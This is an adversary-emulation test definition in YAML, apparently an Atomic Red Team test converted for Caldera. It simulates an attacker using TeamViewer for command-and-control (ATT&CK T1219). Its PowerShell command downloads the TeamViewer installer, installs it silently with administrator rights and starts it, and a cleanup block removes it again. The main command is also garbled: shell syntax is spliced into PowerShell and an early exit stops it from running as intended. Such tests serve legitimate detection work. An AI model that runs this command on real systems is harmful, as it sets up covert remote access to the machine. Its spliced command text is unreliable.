- id: 8ca3b96d-8983-4a7f-b125-fc98cc0a2aa0
  name: TeamViewer Files Detected Test on Windows
  description: An adversary may attempt to trick the user into downloading teamviewer
    and using this to maintain access to the machine. Download of TeamViewer installer
    will be at the destination location when sucessfully executed.
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Software
  platforms:
    windows:
      psh:
        command: 'if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe")
          {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe";
          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null;
          Invoke-WebRequest -Uri https://download.teamviewer.com/download/TeamViewer_Setup_x64.exe
          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe";
          fi; Start-Process -Wait "PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe"
          /S;; Start-Process ''C:\Program Files\TeamViewer\TeamViewer.exe'''
        cleanup: $file = 'C:\Program Files\TeamViewer\uninstall.exe'; if(Test-Path
          $file){ Start-Process $file "/S" -ErrorAction Ignore | Out-Null }; Remove-Item
          "#{installer_path}" -ErrorAction Ignore | Out-Null; Get-ChildItem "C:\Users\*\AppData\Local"
          "TeamViewer" -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object
          {; $Directory = $_.ToString(); Remove-Item $Directory -Recurse -Force -ErrorAction
          SilentlyContinue; }
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - command-and-control
  - atomic-red-team
  - t1219
  author: Atomic Red Team
  additional_info:
    input_arguments:
      installer_path:
        description: where the installer will be downloaded to or already is located
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\TeamViewer_Setup_x64.exe
      download_url:
        description: url to download teamviewer from
        type: url
        default: https://download.teamviewer.com/download/TeamViewer_Setup_x64.exe
    dependencies:
    - description: 'TeamViewer installer must exist on disk at the specified location
        (#{installer_path})

        '
      prereq_command: "if(Test-Path \"#{installer_path}\") {\n    exit 0\n} else {\n\
        \    exit 1\n}\n"
      get_prereq_command: '$parentpath = Split-Path "#{installer_path}"

        New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null

        Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"

        '
    technique_created: '2018-04-18T17:59:24.739Z'
